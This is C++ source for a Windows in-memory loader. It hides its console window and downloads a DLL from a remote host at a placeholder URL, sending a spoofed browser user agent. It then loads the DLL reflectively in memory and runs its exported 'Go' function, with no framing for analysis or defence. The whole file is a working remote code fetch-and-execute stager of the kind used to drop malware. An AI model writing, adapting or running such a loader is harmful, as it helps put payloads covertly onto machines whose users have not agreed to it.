#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <Winhttp.h>
#include "MemoryModule.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Winhttp.lib")


#define XYZ_SIZE 1024*512
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef VOID(*msg)(VOID);
PBYTE bFileBuffer = NULL;

#define _CRT_SECURE_NO_DEPRECATE


typedef struct _URL_INFO
{
	WCHAR szScheme[512];
	WCHAR szHostName[512];
	WCHAR szUserName[512];
	WCHAR szPassword[512];
	WCHAR szUrlPath[512];
	WCHAR szExtraInfo[512];
}URL_INFO, * PURL_INFO;

void download(const wchar_t* Url)
{
	URL_INFO url_info = { 0 };
	URL_COMPONENTSW lpUrlComponents = { 0 };
	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
	lpUrlComponents.lpszHostName = url_info.szHostName;
	lpUrlComponents.lpszPassword = url_info.szPassword;
	lpUrlComponents.lpszScheme = url_info.szScheme;
	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
	lpUrlComponents.lpszUserName = url_info.szUserName;

	lpUrlComponents.dwExtraInfoLength =
	lpUrlComponents.dwHostNameLength =
	lpUrlComponents.dwPasswordLength =
	lpUrlComponents.dwSchemeLength =
	lpUrlComponents.dwUrlPathLength =
	lpUrlComponents.dwUserNameLength = 512;

	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &lpUrlComponents);

	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
	
	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", lpUrlComponents.lpszUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);
	WinHttpCloseHandle(hRequest);

	hRequest = WinHttpOpenRequest(hConnect, L"GET", lpUrlComponents.lpszUrlPath, L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);


	ZeroMemory(bFileBuffer, XYZ_SIZE);
	do{
		WinHttpReadData(hRequest, bFileBuffer, dwContentSize, &dwReadBytes);
	} while (dwReadBytes == 0);


	
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);


}

int main()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer = new BYTE[XYZ_SIZE];
	download(L"http://xyz.com/xyz.dll");
	hModule = MemoryLoadLibrary(bFileBuffer);

	if (hModule == NULL) {
		delete[] bFileBuffer;
	}
	
	DllMain = (Module)MemoryGetProcAddress(hModule, "Go");
	DllMain(0, 0, 0);
	DWORD dwThread;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);
	delete[] bFileBuffer;
	return GetLastError();

	
}

